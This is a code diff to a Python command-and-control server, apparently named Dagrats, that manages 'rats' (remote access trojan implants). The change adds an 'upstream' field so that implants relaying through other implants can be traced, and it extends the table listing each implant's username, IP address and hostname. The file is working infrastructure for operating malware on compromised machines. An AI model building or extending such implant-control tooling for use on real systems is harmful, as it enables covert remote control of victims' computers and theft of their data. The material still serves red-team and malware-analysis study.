@@ -59,6 +59,7 @@ usernames = {}
 hostnames = {}
 ip_addrs = {}
 notes = {}
+upstream = {}
 
 
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
@@ -174,7 +175,7 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.6.15 No more CMD.exe        "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v2.0.-1 Imagine the Graph      "`
     """
     pretty_print(banner)
 
@@ -221,6 +222,8 @@ def colors(value):
         return(colors[types[value]] + value + ENDC)
     elif(value == "all"):
         return(BOLD + "ALL RATS" + ENDC)
+    elif(value == "<direct>"):
+        return("<direct>")
     elif(value == ">>"):
         return( BOLD + c + ">" + js + ">" + ENDC)
     elif(value == "quit"):
@@ -487,7 +490,7 @@ def serve_server(port=8080):
         # Parse POST parameters into JSON string then into python dict
         post_json = request.get_json(force=True)
         if(verbose):
-            pretty_print("[v] rat  sent data: " + str(post_json))
+            pretty_print("[v] rat sent data: " + str(post_json))
         
         try:
             post_dict = dict(post_json)
@@ -518,11 +521,16 @@ def serve_server(port=8080):
             hostnames[ratID] = hostname
             ip_addrs[ratID] = ip_addr
     
-            # If there is no current command for a rat, create a blank one
+            # Register new rat checkin
             if(ratID not in commands):
                 commands[ratID] = ""
                 comp.add_tab_item(ratID)
                 pretty_print("[*] (" + datetime.now().strftime("%H:%M:%S, %b %d") + ") New rat checked in: " + colors(ratID))
+                if(ratID == str(packages[-1]['id'])): # if the ratID is the same as the ratID in the last (or only package) then it is a directly connected rat
+                    upstream[ratID] = "<direct>"
+                else:
+                    upstream[ratID] = packages[-1]['id'] # the last package is the package on "top of the stack" and so the most upstream rat
+
     
             if("retval" in package.keys()):
                 commands[ratID] = ""
@@ -592,13 +600,13 @@ def get_stagers(lhost):
     pretty_print("")
 
 def get_rats(current=""):
-    pretty_print("\n    {:<10}\t{:<4}\t{:<8}\t{:<20}\t{:<15}\t{:<10}".format("implant id", "type", "check-in","username","ip address","hostname"))
-    pretty_print("    ----------\t----\t--------\t--------            \t----------     \t--------")
+    pretty_print("\n    {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<10}".format("implant id","type","check-in","upstream","username","ip address","hostname"))
+    pretty_print("    ----------\t----\t--------   --------     --------               \t----------     \t--------")
     for ratID, checkin in rats.items():
         if(current == ratID or current == "all"):
-            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}\t{:<20}\t{:<15}\t{:<10}".format(colors(">>"), ratID, colors(types[ratID]), colors(checkin), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
+            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<10}".format(colors(">>"), ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
         else:
-            pretty_print("    {:<10}\t{:<4}\t{:<8}\t{:<20}\t{:<15}\t{:<10}".format(ratID, colors(types[ratID]), colors(checkin), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
+            pretty_print("    {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<10}".format(ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
         if(ratID in notes.keys() and notes[ratID] != ""):
             pretty_print("      L..:>> " + notes[ratID])
     pretty_print("")
